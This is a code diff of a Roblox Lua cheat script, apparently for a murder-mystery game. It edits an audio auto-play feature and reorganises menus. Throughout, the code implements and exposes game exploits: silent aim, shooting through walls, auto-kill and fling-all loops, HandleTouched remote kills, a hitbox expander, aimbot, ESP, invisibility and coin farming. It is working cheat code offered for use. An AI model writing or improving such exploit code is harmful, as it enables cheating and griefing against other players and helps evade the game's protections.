+        local s = Instance.new("Sound")
+        s.SoundId = "rbxassetid://" .. tostring(idNum)
+        s.Volume = 0
+        s.Parent = SoundService
+        mirrorSound = s
+        s.Ended:Connect(function()
+            if mirrorSound ~= s then return end
+            if not state.radioAutoPlay then return end
+            if tostring(state.radioSelectedSongId or "") ~= tostring(idNum) then return end
+            task.wait(0.4)
+            firePlaySong(idNum, true, true)
+            task.wait(0.3)
+            startMirror(idNum)
+        end)
+        pcall(function() s:Play() end)
+    end
+
+    firePlaySong = function(rawId, tryAllFormats, skipMirror)
         if not PlaySong or not PlaySong.Parent then
             PlaySong = findPlaySong()
         end
@@ -3514,10 +3519,14 @@ do
             end)
             if i < #formats then task.wait(0.08) end
         end
+        if not skipMirror and state.radioAutoPlay then
+            startMirror(idNum)
+        end
         return true
     end
 
     local function stopAudio()
+        stopMirror()
         if not PlaySong or not PlaySong.Parent then
             PlaySong = findPlaySong()
         end
@@ -3591,7 +3600,7 @@ do
     songArrow.Size = UDim2.new(0, 24, 0, 24)
     songArrow.Position = UDim2.new(1, -32, 0.5, -12)
     songArrow.BackgroundTransparency = 1
-    songArrow.Text = "v"
+    songArrow.Text = "▼"
     songArrow.TextColor3 = cc3(settingsConfig.textColor)
     songArrow.Font = Enum.Font.GothamBold
     songArrow.TextSize = 13
@@ -3648,7 +3657,7 @@ do
             empty.Size = UDim2.new(1, 0, 0, 34)
             empty.LayoutOrder = 1
             empty.BackgroundTransparency = 1
-            empty.Text = "(no saved songs - add one below)"
+            empty.Text = "(no saved songs — add one below)"
             empty.TextColor3 = cc3(settingsConfig.tabTextColor)
             empty.Font = Enum.Font.Gotham
             empty.TextSize = 12
@@ -3701,7 +3710,7 @@ do
     function setSongListOpen(want)
         if songListOpen == want then return end
         songListOpen = want
-        songArrow.Text = want and "^" or "v"
+        songArrow.Text = want and "▲" or "▼"
         if want then
             rebuildSongList()
             local visibleCount = math.min(math.max(#savedSongs, 1), 5)
@@ -3761,7 +3770,7 @@ do
         if stopAudio() then
             _G.__AW_NOTIFY("Audio stopped")
         else
-            _G.__AW_NOTIFY("Could not stop audio")
+            _G.__AW_NOTIFY("Could not stop audio — no stop remote or PlaySong missing")
         end
     end)
 
@@ -3820,49 +3829,33 @@ do
             if stopRemote then
                 _G.__AW_NOTIFY("PlaySong: " .. PlaySong:GetFullName() .. " | Stop: " .. stopRemote:GetFullName())
             else
-                _G.__AW_NOTIFY("PlaySong found at: " .. PlaySong:GetFullName() .. " (no stop remote found)")
+                _G.__AW_NOTIFY("PlaySong found at: " .. PlaySong:GetFullName() .. " (no stop remote found — fallback will be used)")
             end
         else
-            _G.__AW_NOTIFY("PlaySong remote NOT FOUND")
+            _G.__AW_NOTIFY("PlaySong remote NOT FOUND anywhere in ReplicatedStorage")
         end
     end)
 
-    tgg(pages[SECRET_NAME], "Auto Play Audio (loops when finished)", 110, "radioAutoPlay")
-
-    -- ===== Track Sounds so we can replay when they finish =====
-    local trackedSounds = setmetatable({}, {__mode = "k"})
-    local SoundService = game:GetService("SoundService")
-
-    local function bindSoundRestart(s)
-        if not s:IsA("Sound") then return end
-        if trackedSounds[s] then return end
-        trackedSounds[s] = true
-        s.Ended:Connect(function()
-            if state.radioAutoPlay and state.radioSelectedSongId and state.radioSelectedSongId ~= "" then
-                task.wait(0.3)
-                firePlaySong(state.radioSelectedSongId, true)
-            end
-        end)
-    end
-
-    task.spawn(function()
-        while true do
-            task.wait(0.5)
-            if state.radioAutoPlay then
-                pcall(function()
-                    for _, s in ipairs(SoundService:GetDescendants()) do bindSoundRestart(s) end
-                    for _, s in ipairs(Workspace:GetDescendants()) do bindSoundRestart(s) end
-                    for _, s in ipairs(LP:GetDescendants()) do bindSoundRestart(s) end
-                end)
-            end
-        end
-    end)
-
-    -- Play once when character spawns
+    tgg(pages[SECRET_NAME], "Auto Play Audio", 110, "radioAutoPlay")
     LP.CharacterAdded:Connect(function()
         if state.radioAutoPlay and state.radioSelectedSongId and state.radioSelectedSongId ~= "" then
             task.wait(1.5)
             firePlaySong(state.radioSelectedSongId, true)
+        end
+    end)
+
+    task.spawn(function()
+        local lastAuto = state.radioAutoPlay
+        while true do
+            task.wait(0.5)
+            if state.radioAutoPlay ~= lastAuto then
+                lastAuto = state.radioAutoPlay
+                if not lastAuto then
+                    stopMirror()
+                elseif state.radioSelectedSongId and state.radioSelectedSongId ~= "" then
+                    startMirror(state.radioSelectedSongId)
+                end
+            end
         end
     end)
 end
@@ -4137,7 +4130,7 @@ do
     creditBody.Size = UDim2.new(1, -20, 1, -40)
     creditBody.Position = UDim2.new(0, 10, 0, 32)
     creditBody.BackgroundTransparency = 1
-    creditBody.Text = "lzzzx\nnoir (7yd7)"
+    creditBody.Text = "• lzzzx\n• noir (7yd7)"
     creditBody.TextColor3 = cc3(settingsConfig.textColor)
     creditBody.Font = Enum.Font.Gotham
     creditBody.TextSize = 12
@@ -4157,11 +4150,11 @@ tgg(pages["Farm"], "Full Bag Gate", 6, "fullBagGate")
 addSect(pages["Combat"], "Silent Aim", 1)
 tgg(pages["Combat"], "Silent Aim", 2, "silentAimEnabled")
 tgg(pages["Combat"], "Silent Aim Wall Check", 3, "silentAimWallCheck")
-makeSlider(pages["Combat"], "Silent Aim Height", 4, state.silentAimYHeight or 2, 0, 2, "silentAimYHeight")
+makeSlider(pages["Combat"], "Silent Aim Height (0=feet, 2=head)", 4, state.silentAimYHeight or 2, 0, 2, "silentAimYHeight")
 tgg(pages["Combat"], "Shoot Through Walls", 10, "shootThroughWall")
 tgg(pages["Combat"], "Auto Shoot Murderer", 11, "autoShootMurderer")
 addBtn(pages["Combat"], "Shoot Murderer Now", 12, fullShootSequence)
-addBtn(pages["Combat"], "Shoot Through Wall", 13, fireThroughWall)
+addBtn(pages["Combat"], "Shoot Through Wall (Magic Bullet)", 13, fireThroughWall)
 addSect(pages["Combat"], "Auto Actions", 20)
 tgg(pages["Combat"], "Auto Kill All", 21, "autoKillAll")
 tgg(pages["Combat"], "Loop Fling All", 22, "loopFlingAll")
@@ -4171,17 +4164,16 @@ tgg(pages["Combat"], "Loop Fling Custom", 25, "loopFlingCustom")
 tgg(pages["Combat"], "Auto Reset: Murderer", 26, "autoResetMurderer")
 tgg(pages["Combat"], "Auto Reset: Sheriff", 27, "autoResetSheriff")
 tgg(pages["Combat"], "Auto Reset: Innocent", 28, "autoResetInnocent")
-addSect(pages["Combat"], "Manual Actions (Hitbox)", 30)
-addBtn(pages["Combat"], "Fling Murderer Now", 31, flingMurdererNow)
-addBtn(pages["Combat"], "Fling Sheriff Now", 32, flingSheriffNow)
-addBtn(pages["Combat"], "Fling All Now", 33, flingAllNow)
-addBtn(pages["Combat"], "Kill Sheriff Now", 34, killSheriffNow)
-addBtn(pages["Combat"], "Kill All Now", 35, killAllNow)
+addSect(pages["Combat"], "Manual Actions", 30)
+addBtn(pages["Combat"], "Kill All (HandleTouched)", 31, handleTouchKillAll)
+addBtn(pages["Combat"], "Kill Sheriff (HandleTouched)", 32, handleTouchKillSheriff)
+addBtn(pages["Combat"], "Kill Custom (HandleTouched)", 33, handleTouchKillCustom)
+addBtn(pages["Combat"], "Kill Sheriff (Hitbox)", 34, killSheriffNow)
+addBtn(pages["Combat"], "Kill All (Hitbox)", 35, killAllHitboxNow)
 addBtn(pages["Combat"], "Grab Gun Now", 36, grabGunNow)
-addSect(pages["Combat"], "Kill (HandleTouched)", 50)
-addBtn(pages["Combat"], "Kill All (HandleTouched)", 51, handleTouchKillAll)
-addBtn(pages["Combat"], "Kill Sheriff (HandleTouched)", 52, handleTouchKillSheriff)
-addBtn(pages["Combat"], "Kill Custom (HandleTouched)", 53, handleTouchKillCustom)
+addBtn(pages["Combat"], "Fling Murderer Now", 37, flingMurdererNow)
+addBtn(pages["Combat"], "Fling Sheriff Now", 38, flingSheriffNow)
+addBtn(pages["Combat"], "Fling All Now", 39, flingAllNow)
 addSect(pages["Combat"], "Aimbot", 60)
 tgg(pages["Combat"], "Aimbot: Murderer", 61, "aimbotMurderer")
 tgg(pages["Combat"], "Aimbot: Sheriff", 62, "aimbotSheriff")
@@ -4490,14 +4482,12 @@ end)
 -- ============ BUTTON TAB ============
 addSect(pages["Button"], "Shoot Murderer Button", 1)
 tgg(pages["Button"], "Enable Shoot Murderer Button", 2, "bigButtonEnabled")
-tgg(pages["Button"], "Lock Shoot Murderer Button", 3, "bigButtonLocked")
-makeSlider(pages["Button"], "Button Width", 4, state.bigButtonW or 230, 80, 400, "bigButtonW", function(v)
+makeSlider(pages["Button"], "Button Width", 3, state.bigButtonW or 230, 80, 400, "bigButtonW", function(v)
     if bigWrap then bigWrap.Size = UDim2.new(0, v, 0, state.bigButtonH or 82) end
 end)
-makeSlider(pages["Button"], "Button Height", 5, state.bigButtonH or 82, 40, 200, "bigButtonH", function(v)
+makeSlider(pages["Button"], "Button Height", 4, state.bigButtonH or 82, 40, 200, "bigButtonH", function(v)
     if bigWrap then bigWrap.Size = UDim2.new(0, state.bigButtonW or 230, 0, v) end
 end)
-
 addSect(pages["Button"], "Floating Buttons", 10)
 tgg(pages["Button"], "Enable Floating Buttons", 11, "floatButtonsEnabled")
 makeSlider(pages["Button"], "Button Size", 12, state.floatButtonSize or 68, 44, 120, "floatButtonSize", function(v)
@@ -4510,72 +4500,81 @@ makeSlider(pages["Button"], "Button Size", 12, state.floatButtonSize or 68, 44, 
     end
 end)
 
--- ===== Lock System =====
-addSect(pages["Button"], "Lock System", 20)
+addSect(pages["Button"], "Lock System", 12.5)
 
-local function getLockableButtonNames()
-    local list = {}
-    for _, def in ipairs(FLOAT_BUTTON_DEFS) do
-        table.insert(list, def.label)
-    end
-    table.insert(list, "Shoot Murderer Button")
-    return list
-end
-
-local function findDefByLabel(label)
-    for _, def in ipairs(FLOAT_BUTTON_DEFS) do
-        if def.label == label then return def end
-    end
-    return nil
-end
-
-addBtn(pages["Button"], "Lock All Buttons", 21, function()
+addBtn(pages["Button"], "Lock All Buttons (Drag Only — still clickable)", 12.6, function()
     for _, def in ipairs(FLOAT_BUTTON_DEFS) do
         state.lockedButtons[def.id] = true
     end
     state.bigButtonLocked = true
     saveSettings()
-    _G.__AW_NOTIFY("All buttons locked")
+    _G.__AW_NOTIFY("All buttons locked in place (still clickable)")
 end)
-addBtn(pages["Button"], "Unlock All Buttons", 22, function()
+
+addBtn(pages["Button"], "Unlock All Buttons", 12.7, function()
     state.lockedButtons = {}
     state.bigButtonLocked = false
     saveSettings()
     _G.__AW_NOTIFY("All buttons unlocked")
 end)
-makeDropdown(pages["Button"], "Lock Specific Button", 23, getLockableButtonNames(), "Select...", function(choice)
-    if choice == "Shoot Murderer Button" then
-        state.bigButtonLocked = true
-        saveSettings()
-        _G.__AW_NOTIFY("Shoot Murderer Button locked")
-        return
-    end
-    local def = findDefByLabel(choice)
-    if def then
-        state.lockedButtons[def.id] = true
-        saveSettings()
-        _G.__AW_NOTIFY(def.label .. " locked")
-    end
-end)
-makeDropdown(pages["Button"], "Unlock Specific Button", 24, getLockableButtonNames(), "Select...", function(choice)
-    if choice == "Shoot Murderer Button" then
-        state.bigButtonLocked = false
-        saveSettings()
-        _G.__AW_NOTIFY("Shoot Murderer Button unlocked")
-        return
-    end
-    local def = findDefByLabel(choice)
-    if def then
-        state.lockedButtons[def.id] = nil
-        saveSettings()
-        _G.__AW_NOTIFY(def.label .. " unlocked")
-    end
-end)
 
-addSect(pages["Button"], "Button Shape", 30)
+do
+    local lockOpts = {}
+    for _, def in ipairs(FLOAT_BUTTON_DEFS) do
+        if state.floatEnabledButtons[def.id] then table.insert(lockOpts, def.label) end
+    end
+    table.insert(lockOpts, "Shoot Murderer Button")
+    if #lockOpts == 1 then table.insert(lockOpts, "(no floating buttons enabled)") end
+
+    makeDropdown(pages["Button"], "Lock Specific Button", 12.8, lockOpts, "Pick to lock...", function(choice)
+        if choice == "Shoot Murderer Button" then
+            state.bigButtonLocked = true
+            saveSettings()
+            _G.__AW_NOTIFY("Locked: Shoot Murderer Button")
+            return
+        end
+        for _, def in ipairs(FLOAT_BUTTON_DEFS) do
+            if def.label == choice and state.floatEnabledButtons[def.id] then
+                state.lockedButtons[def.id] = true
+                saveSettings()
+                _G.__AW_NOTIFY("Locked: " .. def.label)
+                return
+            end
+        end
+    end)
+end
+
+do
+    local unlockOpts = {}
+    for id in pairs(state.lockedButtons) do
+        local def = FLOAT_BUTTON_MAP[id]
+        if def then table.insert(unlockOpts, def.label) end
+    end
+    if state.bigButtonLocked then table.insert(unlockOpts, "Shoot Murderer Button") end
+    if #unlockOpts == 0 then table.insert(unlockOpts, "(nothing locked)") end
+
+    makeDropdown(pages["Button"], "Unlock Specific Button", 12.9, unlockOpts, "Pick to unlock...", function(choice)
+        if choice == "Shoot Murderer Button" then
+            state.bigButtonLocked = false
+            saveSettings()
+            _G.__AW_NOTIFY("Unlocked: Shoot Murderer Button")
+            return
+        end
+        for _, def in ipairs(FLOAT_BUTTON_DEFS) do
+            if def.label == choice then
+                state.lockedButtons[def.id] = nil
+                saveSettings()
+                _G.__AW_NOTIFY("Unlocked: " .. def.label)
+                return
+            end
+        end
+    end)
+end
+
+addSect(pages["Button"], "Button Shape", 13)
 local shapeHolder = Instance.new("Frame", pages["Button"])
 shapeHolder.Size = UDim2.new(1, 0, 0, 40)
-shapeHolder.LayoutOrder = 31
+shapeHolder.LayoutOrder = 14
 shapeHolder.BackgroundTransparency = 1
 local shapeLayout = Instance.new("UIListLayout", shapeHolder)
 shapeLayout.FillDirection = Enum.FillDirection.Horizontal
@@ -4603,12 +4602,11 @@ for i, sp in ipairs(SHAPES) do
         rebuildFloatButtons()
     end)
 end
-
-addSect(pages["Button"], "Manage Floating Buttons", 40)
+addSect(pages["Button"], "Manage Floating Buttons", 20)
 do
     local mSearch = Instance.new("TextBox", pages["Button"])
     mSearch.Size = UDim2.new(1, 0, 0, 34)
-    mSearch.LayoutOrder = 41
+    mSearch.LayoutOrder = 21
     mSearch.BackgroundColor3 = cc3(settingsConfig.cardColor)
     mSearch.PlaceholderText = "Search..."
     mSearch.PlaceholderColor3 = cc3(settingsConfig.tabTextColor)
@@ -4620,7 +4618,7 @@ do
     Instance.new("UICorner", mSearch).CornerRadius = UDim.new(0, 10)
     local mList = Instance.new("ScrollingFrame", pages["Button"])
     mList.Size = UDim2.new(1, 0, 0, 300)
-    mList.LayoutOrder = 42
+    mList.LayoutOrder = 22
     mList.BackgroundTransparency = 1
     mList.ScrollBarThickness = 3
     mList.CanvasSize = UDim2.new(0, 0, 0, 0)
@@ -4861,7 +4859,7 @@ do
 end
 addSect(pages["UI"], "Toggles", 4)
 tgg(pages["UI"], "Notification Sound", 6, "notifySound")
-tgg(pages["UI"], "Enable Animations (uncheck for plain look)", 7, "animationsEnabled")
+tgg(pages["UI"], "Enable Animations", 7, "animationsEnabled")
 
 -- ============ OPEN/CLOSE BUTTON ============
 local fb = Instance.new("TextButton", sg)
@@ -5162,7 +5160,6 @@ task.spawn(function()
     end
 end)
 
--- ============ HITBOX EXPANDER LOOP ============
 task.spawn(function()
     while true do
         task.wait(0.1)
@@ -5184,7 +5181,6 @@ task.spawn(function()
     end
 end)
 
--- ============ SILENT LOOP REFRESH ============
 task.spawn(function()
     local wasInRound = false
     local LOOP_KEYS = {"loopFlingAll", "loopFlingMur", "loopFlingSheriff", "loopFlingCustom"}
@@ -5292,12 +5288,13 @@ task.spawn(function()
             if state.autoKillAll then
                 local knife = findTool("Knife")
                 if knife then
+                    local targets = {}
                     for _, p in ipairs(Players:GetPlayers()) do
                         if p ~= LP and targetIsAlive(p) and not isWhitelisted(p) then
-                            task.spawn(function() executeHitboxKill(p) end)
-                            task.wait(0.5)
+                            table.insert(targets, p)
                         end
                     end
+                    if #targets > 0 then fireHandleTouchedKill(targets) end
                 end
             end
         end
@@ -5381,7 +5378,6 @@ task.spawn(function()
     end
 end)
 
--- ============ BLUE AURA LOOP ============
 task.spawn(function()
     while true do
         task.wait(0.5)
@@ -5410,7 +5406,6 @@ task.spawn(function()
     end
 end)
 
--- ============ WALL HOP LOOP ============
 do
     local rayParams = RaycastParams.new()
     rayParams.FilterType = Enum.RaycastFilterType.Exclude
@@ -5438,7 +5433,6 @@ do
     end)
 end
 
--- ============ INVISIBILITY SYSTEM ============
 local INVIS_POSITION = Vector3.new(-25.95, 84, 3537.55)
 local invisSeat = nil
 local invisWeld = nil
@@ -5559,7 +5553,6 @@ task.spawn(function()
     end
 end)
 
--- ============ TOUCH FLING ============
 task.spawn(function()
     if not ReplicatedStorage:FindFirstChild("juisdfj0i32i0eidsuf0iok") then
         local detection = Instance.new("Decal")
@@ -5592,7 +5585,6 @@ task.spawn(function()
     end
 end)
 
--- ============ AIMBOT ============
 local currentAimTarget = nil
 RunService.RenderStepped:Connect(function(dt)
     if not alive() then currentAimTarget = nil; return end
@@ -5657,7 +5649,6 @@ RunService.RenderStepped:Connect(function(dt)
     end
 end)
 
--- ============ ESP ============
 local espF = nil
 local espCache, gunDropCache = {}, {}
 local function getOrCreateEspFolder()
@@ -5825,7 +5816,6 @@ task.spawn(function()
     end
 end)
 
--- ============ FARM LOOP ============
 local HIDE_POS = CFrame.new(0,-300,0)
 local lastCoinFoundTime = tick()
 local NO_COIN_TIMEOUT = 12
